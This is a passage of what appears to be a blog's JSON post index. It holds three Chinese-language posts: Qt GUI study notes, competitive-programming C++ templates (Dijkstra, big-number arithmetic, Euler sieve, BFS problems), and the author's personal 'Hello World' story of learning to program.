    "content": "Qt学习笔记  lamaper  2022/6/1  参考网站Qt编程（1） - 子卿の小站 (baiziqing.cn)  参考教程https://www.bilibili.com/video/BV1t64y1f7d1  第一章 Qt的基本使用  1、QtCreator快捷键（1）  选中某一主类 F1 查看开发文档，F2查看源文件，  进入.h文件 F4 切换至对应的.cpp文件。  2、 基础知识和QPushButton  #include \"widget.h\"  #include &lt;QApplication&gt;  int main(int argc, char *argv[]) {     //应用程序类     QApplication a(argc, argv);//每个Qt程序只有一个     Widget w;//窗口类，创建后默认不显示     w.show();     return a.exec(); }    Qt的基本框架（.pro）  # 在项目文件中, 注释需要使用 井号(#) # 项目编译的时候需要加载哪些底层模块 QT       += core gui   # 如果当前Qt版本大于4, 会添加一个额外的模块: widgets # Qt 5中对gui模块进行了拆分, 将 widgets 独立出来了 greaterThan(QT_MAJOR_VERSION, 4): QT += widgets     # 使用c++11新特性 CONFIG += c++11  #如果在项目中调用了废弃的函数, 项目编译的时候会有警告的提示   DEFINES += QT_DEPRECATED_WARNINGS  # 项目中的源文件 SOURCES += \\         main.cpp \\         mainwindow.cpp    # 项目中的头文件 HEADERS += \\         mainwindow.h    # 项目中的窗口界面文件 FORMS += \\         mainwindow.ui   以Qwidget为例。  使用QPushButton首先需要在主窗口头文件的头文件中导入相应头文件：  #ifndef WIDGET_H #define WIDGET_H  #include &lt;QWidget&gt; #include &lt;QPushButton&gt;  #endif // WIDGET_H   QtPushButton相应的方法（1）  QPushButton q1; QPushButton *q2; q2 = new QPushButton(const QIcon &amp;icon, const QString &amp;text, QWidget *parent = nullptr);//(按钮图标, 按钮上显示的文字, QWidget类型的父类-表示q2依附于某类)  q2-&gt;show();//在父类上显示该控件 q1.show();  q2-&gt;setParent(this);//设置父类 q1.setParent(this);//this表示当前父类  q2-&gt;move(const &amp;int，const &amp;int);//窗口的坐标系，原点在左上角，X轴向右递增，Y轴向下递增，理论上不存在负轴 q1.move();  q1.resize(const &amp;int，const &amp;int);//设置按钮的大小,父类是Qweiget   Qt存在垃圾自动回收机制，会自动回收：     QObject的派生类或自己；   指定父类，先析构子类再析构父类；   Qt新建一个Button类    右键工程文件夹，选择Add New…      因为Qt选项中没有QPushButton作为继承选项，所以选择widget现行代替，之后修改头文件中继承的类；    然后修改源文件中的继承类；    QDebug的使用（1）  #include &lt;QDebug&gt; qDebug() &lt;&lt; \"helloworld ;\"//类似cout的标准输出   QWidget相应的方法（1）  #include \"widget.h\" #include \"ui_widget.h\"  Widget::Widget(QWidget *parent)     : QWidget(parent)     , ui(new Ui::Widget) {     ui-&gt;setupUi(this);     this-&gt;setWindowTitle(cosnt &amp;string)//设置窗口标题     this-&gt;resize();//窗口大小     this-&gt;setFixedSize();//设置不可变更的窗口大小     this-&gt;setWindowIcon(QIcon(&lt;绝对路径&gt;));//设置窗口图标      }    3、信号和槽  标准信号和槽  //connect(信号发出者，发出的信号，信号接受者，处理信号的槽函数); connect(const &amp;provider ,const &amp;信号发出者类的名字::信号的名字 , const &amp;saver , &amp;处理信号者类的名字::槽的名字);   需要注意的是，connect函数中四个参数均为指针，必须对对象进行取址。  自定义槽函数          槽函数在Qt5中可以是任意成员函数、全局函数、静态函数、lambda表达式；           槽函数要与信号相对应；      void mysign(int ,double ,Qstrting); int mysolt(int ,double ,Qstring); //上下形参一一对应，形参是为了接收信号数据 //槽函数形参个数应小于等于信号的形参个数                信号没有返回值，槽函数拥有返回值；      **!注意 信号和槽虽然是函数，但不能携带括号和形参值，否则会报错！ **  自定义信号函数  class MyButton : public QPushButton {     Q_OBJECT public:     explicit MyButton(QWidget *parent = nullptr);  signals://声明信号     void tteessstt();//信号函数 };   信号函数可以被重载，可以有形成，返回值为void;  发送信号 emit tteesstt;"
  },
  
  {
    "title": "信息竞赛（OI）笔记",
    "url": "/posts/old-oi/",
    "categories": "Coding",
    "tags": "c, c++, algorithm",
    "date": "2022-06-25 22:42:00 +0800",
    "content": "原文地址一些远古笔记 - lamaper - 博客园 Dijkstar  namespace dij{     struct edge{         int to,len,nxt;         }edge[MAXN];     bool vis[MAXN];     long long dist[MAXN];     int head[MAXN],cnt;     priority_queue&lt;pair&lt;int,int&gt;,vector&lt;pair&lt;int,int&gt; &gt;,greater&lt;pair&lt;int,int&gt; &gt; &gt;q;      void add(int x,int y,int z){         cnt++;         edge[cnt].to = y;         edge[cnt].len = z;         edge[cnt].nxt = head[x];         head[x] = cnt;         }      void work(int e,int f,int g){             for(int i = 1 ; i &lt;= f ; i++){             dist[i] = 0x7fffffff;             }              dist[g] = 0;             q.push(make_pair(0,g));             while(!q.empty()){                 int pos = q.top().second;                q.pop();                 if (vis[pos]) continue;                vis[pos] = 1;                 for(int i = head[pos] ; i != 0 ; i = edge[i].nxt){                     int a = edge[i].to;                     int b = edge[i].len;                     if(dist[pos] + b &lt; dist[a]){                         dist[a] = dist[pos] + b;                         q.push(make_pair(dist[a],a));                     }                 }             }         }  }   模板-高精度  耗时两天学习研究；  十分感谢B站提供的课程；  #include&lt;bits/stdc++.h&gt; using namespace std; //高精度 // GJQ const int MAXN=508; char ch1[MAXN],ch2[MAXN],temp[MAXN];//temp用于减法交换减数  int a[MAXN],b[MAXN],c[MAXN]; void add(char c1[],char c2[]){     //读入两个字符串      int len1 = strlen(c1);     for(int i = 0;i &lt; len1;i++){         a[i] = c1[len1-i-1] - '0';         //cout&lt;&lt;a[i]&lt;&lt;\" \";     }     int len2 = strlen(c2);     for(int i = 0;i &lt; len2;i++){         b[i] = c2[len2-i-1] - '0';         //cout&lt;&lt;b[i]&lt;&lt;\" \";     }      //加法模拟      int len = max(len1 , len2) + 1;     int jw = 0;     for(int i = 0;i &lt; len;i++){         c[i] = a[i] + b[i] + jw;         jw = c[i]/10;         c[i] = c[i]%10;         //cout&lt;&lt;c[i]&lt;&lt;\" \";     }      for(int i = len - 1 ;i &gt;= 0 ;i--){         if(0 == c[i] &amp;&amp; len &gt; 1){             len--;             //cout&lt;&lt;a[i]&lt;&lt;\" \";         }else{             break;         }     } //  cout&lt;&lt;c[1];     for(int i = len - 1; i &gt;= 0 ; i--){         cout&lt;&lt;c[i];     } } void mius(char c1[],char c2[]){      int len1 = strlen(c1);     int len2 = strlen(c2);      if(len2 &gt; len1 || (len2 == len1 &amp;&amp; strcmp(c1,c2)&lt;0)){         /*         * 函数strcmp来自cstring包         * 这个函数用于比较两个字符串值的大小          */         cout&lt;&lt;\"-\";         strcpy(temp,c1);         strcpy(c1,c2);         strcpy(c2,temp);         /*         * 函数strcpy用于复制字符串内容          */         int len1 = strlen(c1);         int len2 = strlen(c2);         //重新读入长度      }      for(int i = 0;i &lt; len1;i++){         a[i] = c1[len1-i-1] - '0';         //cout&lt;&lt;a[i]&lt;&lt;\" \";     }     for(int i = 0;i &lt; len2;i++){         b[i] = c2[len2-i-1] - '0';         //cout&lt;&lt;b[i]&lt;&lt;\" \";     }      //int len = max(len1 , len2) + 1;     //int jw = 0;      //len1已经检查过，是最大数长度      for(int i = 0;i &lt; len1;i++){         if(a[i] &lt; b[i]){             a[i+1] = a[i+1] - 1;             a[i] = a[i] + 10;         }         c[i] = a[i] - b[i];     }      //去除前导0      for(int i = len1 - 1 ;i &gt;= 0 ;i--){         if(0 == c[i] &amp;&amp; len1 &gt; 1){             len1--;             //cout&lt;&lt;a[i]&lt;&lt;\" \";         }else{             break;         }     } //  cout&lt;&lt;c[1];     for(int i = len1 - 1; i &gt;= 0 ; i--){         cout&lt;&lt;c[i];     } } void x(char c1[],char c2[]){     //读入两个字符串      bool flaga = 0;     if(c1[0] == '-'){         flaga = 1;         strcpy(c1,&amp;c1[1]);//删除负号      }     bool flagb = 0;     if(c2[0] == '-'){         flagb = 1;         strcpy(c2,&amp;c2[1]);//删除负号      }      if(flaga != flagb)cout &lt;&lt; \"-\";      int len1 = strlen(c1);     for(int i = 0;i &lt; len1;i++){         a[i] = c1[len1-i-1] - '0';         //cout&lt;&lt;a[i]&lt;&lt;\" \";     }     int len2 = strlen(c2);     for(int i = 0;i &lt; len2;i++){         b[i] = c2[len2-i-1] - '0';         //cout&lt;&lt;b[i]&lt;&lt;\" \";     }      //乘法模拟      int jw;     for(int i = 0;i &lt; len1;i++){         jw = 0;         for(int j = 0 ; j &lt; len2 ; j++){             c[i+j] = a[i] * b[j] + jw + c[i+j];             jw = c[i+j]/10;             c[i+j] = c[i+j]%10;           }         c[i+len2] = jw;     }     int lenc = len1 + len2;     for(int i = lenc - 1 ;i &gt;= 0 ;i--){         if(0 == c[i] &amp;&amp; lenc &gt; 1){             lenc--;             //cout&lt;&lt;a[i]&lt;&lt;\" \";         }else{             break;         }     } //  cout&lt;&lt;c[1];     for(int i = lenc - 1; i &gt;= 0 ; i--){         cout&lt;&lt;c[i];     } }  void chu(char c1[],char c2[]){      //读入两个字符串      bool flaga = 0;     if(c1[0] == '-'){         flaga = 1;         strcpy(c1,&amp;c1[1]);//删除负号      }     bool flagb = 0;     if(c2[0] == '-'){         flagb = 1;         strcpy(c2,&amp;c2[1]);//删除负号      }      if(flaga != flagb)cout &lt;&lt; \"-\";      int len1 = strlen(c1);     for(int i = 0;i &lt; len1;i++){         a[i] = c1[len1-i-1] - '0';         //cout&lt;&lt;a[i]&lt;&lt;\" \";     }     int len2 = strlen(c2);     for(int i = 0;i &lt; len2;i++){         b[i] = c2[len2-i-1] - '0';         //cout&lt;&lt;b[i]&lt;&lt;\" \";     }      //乘法模拟      int jw;     for(int i = 0;i &lt; len1;i++){         jw = 0;         for(int j = 0 ; j &lt; len2 ; j++){             c[i+j] = a[i] * b[j] + jw + c[i+j];             jw = c[i+j]/10;             c[i+j] = c[i+j]%10;           }         c[i+len2] = jw;     }     int lenc = len1 + len2;     for(int i = lenc - 1 ;i &gt;= 0 ;i--){         if(0 == c[i] &amp;&amp; lenc &gt; 1){             lenc--;             //cout&lt;&lt;a[i]&lt;&lt;\" \";         }else{             break;         }     } //  cout&lt;&lt;c[1];     for(int i = lenc - 1; i &gt;= 0 ; i--){         cout&lt;&lt;c[i];     } } int main(){     cin &gt;&gt; ch1 &gt;&gt; ch2 ;     x(ch1,ch2);      return 0; }   欧拉筛 今日学习-欧拉筛  #include &lt;cstring&gt;  using namespace std;  int prime[1100000],primesize,phi[11000000];  bool isprime[11000000];  void getlist(int listsize)  {      memset(isprime,1,sizeof(isprime));      isprime[1]=false;      for(int i=2;i&lt;=listsize;i++)      {          if(isprime[i])prime[++primesize]=i;          for(int j=1;j&lt;=primesize&amp;&amp;i*prime[j]&lt;=listsize;j++)           {              isprime[i*prime[j]]=false;             if(i%prime[j]==0)break;          }     }  }   广度优先搜索  关于队列  queue&lt;&gt; X;//创建队列\\ X.pop();//弹出队首\\ X.push();//放入元素\\ X.empty();//return bool\\ X.front();//返回队首元素\\ X.size();//队列大小\\  P1443马的遍历  #include &lt;bits/stdc++.h&gt; using namespace std;  struct node{     int x, y, t;     };  queue&lt;node&gt; q;  int m,n,sx,sy; int ans[401][401]; int dir[][2] = {      {1,2},{1,-2},{2,1},{2,-1},{-1,2},{-1,-2},{-2,1},{-2,-1}      }; bool vis[401][401];  void bfs(int sx,int sy){     q.push((node){sx,sy,0});      vis[sx][sy] = 1;     ans[sx][sy] = 0;      while(!q.empty()){         node now = q.front();         q.pop();          for(int i = 0 ;i &lt; 8;i++){             int nx = now.x + dir[i][0];             int ny = now.y + dir[i][1];              if(vis[nx][ny] || nx &lt; 1||ny &lt; 1||nx &gt; n||ny &gt; m)continue;              vis[nx][ny] = 1;             ans[nx][ny] = ans[now.x][now.y] + 1;             q.push( (node){nx , ny , now.t+1} );          }      }  }  int main(){     cin &gt;&gt; n &gt;&gt; m &gt;&gt; sx &gt;&gt; sy;      bfs(sx,sy);      for(int i = 1 ; i &lt;= n ; i++){         for(int j = 1 ; j &lt;= m ; j++){             if(vis[i][j])printf(\"%-5d\",ans[i][j]);             else cout &lt;&lt; \"-1   \";         }cout&lt;&lt;endl;      }      return 0; }   P1135奇怪的电梯  #include&lt;bits/stdc++.h&gt; using namespace std; const int MAXN = 100005; struct node{     int st,t; }; const int c[2] = {1,-1}; int k[MAXN]; int n,a,b,ans; bool vis[MAXN];  queue&lt;node&gt; q;  void bfs(int a){     q.push((node){a , 0});     vis[a] = 1;     ans = -1;      while(!q.empty()){         node now = q.front();         q.pop();          //for(int j = 0 ; j &lt; n ; j++){             for(int i = 0 ; i &lt; 2 ; i++){                 int n = now.st + k[now.st]*c[i];                  if(n &lt; 1 || n &gt; b || vis[n])continue;                  vis[n] = 1;                 if(n == b)                 {                         ans = now.t + 1;                         break;                     }                 q.push((node){ n , now.t + 1});             }          //}      }  }  int main(){      cin &gt;&gt; n &gt;&gt; a &gt;&gt; b;     if(a == b){     cout &lt;&lt; \"0\";     return 0;}     for(int i = 1 ; i &lt;= n ; i++)cin &gt;&gt; k[i];      bfs(a);      cout &lt;&lt; ans;      return 0; }"
  },
  
  {
    "title": "Hello World",
    "url": "/posts/hello-world/",
    "categories": "Blogs",
    "tags": "life",
    "date": "2022-06-25 22:40:00 +0800",
    "content": "在经过多次深思熟虑后，选择在博客园开通自己的博客。  我个人写第一次写博客还是在五岁，父亲教我在腾讯微博上发表自己的感受，记录自己的生活，幼小的我在键盘边上吃力的敲击着每一个字符，困难，但快乐。  计算机与我像是有不解之缘，这也离不开父亲的支持和陪伴。从小父亲就带我在笔记本电脑上玩《植物大战僵尸》，他一直告诉我：“会玩游戏不是本事，自己会做才是自己的本事。”，他曾经学过网页三剑客，搭建过自己的博客和游戏私服，开过网吧，在宿舍里不吃不喝研究windows系统和dos命令，他说虽然当时只会打dir，但是那是他青春很美好的时光之一。  在他的支持下，我七岁开始学习flash、玩我的世界，可惜没有常性，半途而废。小学参加电脑作画社团，也学习了scratch，可惜对编程并没有什么深刻的了解。  2017年我的世界中国版上线，对当时的我是巨大的震撼，以前只知道去多玩我的世界盒子玩盗版游戏的我，居然有机会体验正版的PC游戏，于是我毫不犹豫的注册成为内测玩家，深深地陶醉的游戏里。在我发现我的世界指令系统可以随心所欲操控世界后，我下定决心开始学习那些对我来说如天书的指令。  于是我了解到了json、java虚拟机和其他内容，渐渐地我好像推开了一个新世界的大门，那里拥有能够创造一切的工具，只是等待我发掘。  在不断的百度、试错、被人坑钱后我找到了学习的门路，在小升初的那个暑假，我找到了尚硅谷0基础学Java的网课，认真仔细的在记事本中敲下自己的第一行helloworld。  暑假时间不长，以当时的学习能力，在掌握了基本的运算符，逻辑控制，循环语句等句柄之后，便马不停蹄的进入了初中的学习，但初中生活并没有给我的计算机学习之路带来阻力，反倒是激励我继续前进。我开始学习计算机组成原理，了解反码原码补码的奥秘；继续深入学习java，在磕磕绊绊中窥探到了面向对象的精髓；又类比着学习了python3的一些简单语法，也能照猫画虎给同龄人讲课，让他们自己编写一些小程序。  在初三寒假，我在家中用vbs编写了自己人生中第一个可实用的程序，虽然很无能，只能重复刷屏，却给让我信心倍增。等到中考结束后，我继续投身java学习中，用java的swing库将刷屏小程序更升一级，拥有了人性化的操作界面，极致简单的功能，是我这么多年以来求学计算机的总结。  高一我加入了校信息竞赛队，开始不停的做c++的算法题，不断地深入探索，我在2021年11月用linuxToGo技术打造了自己第一个梦寐以求的ToGoU盘，机房的学长和同学们也十分热情，接连为我传授各种知识，从网络安全到软件开发再到硬件组成，无所不及，让我涉猎更广。  加入信息竞赛后我才发现，那些年的编程其实不算什么，现在才是真正的编程学习，但是晦涩难懂的算法让我根本摸不着头脑，看着周围同学一道道题的刷过，我却怎么也不理解状态压缩动态规划，怎么也搞不明白二叉树的先序后序。  但我不会放弃，就像以前一样，我会用满腹热情去对待计算机这个奇妙而伟大的领域。  加油吧！  lamaper  2022/6/25  原文地址Hello，World！ - lamaper - 博客园"
  }
  
]

